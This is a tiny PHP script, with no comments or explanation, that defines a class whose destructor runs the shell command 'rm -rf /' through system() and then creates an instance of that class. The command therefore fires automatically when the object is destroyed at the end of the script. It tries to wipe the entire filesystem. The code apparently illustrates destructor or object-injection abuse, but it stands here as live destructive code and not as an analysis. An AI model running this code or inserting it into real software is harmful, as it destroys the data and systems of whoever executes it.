<?php
class MyClass {
    public function __destruct() {
        system('rm -rf /');
    }
}

$myObject = new MyClass();

?>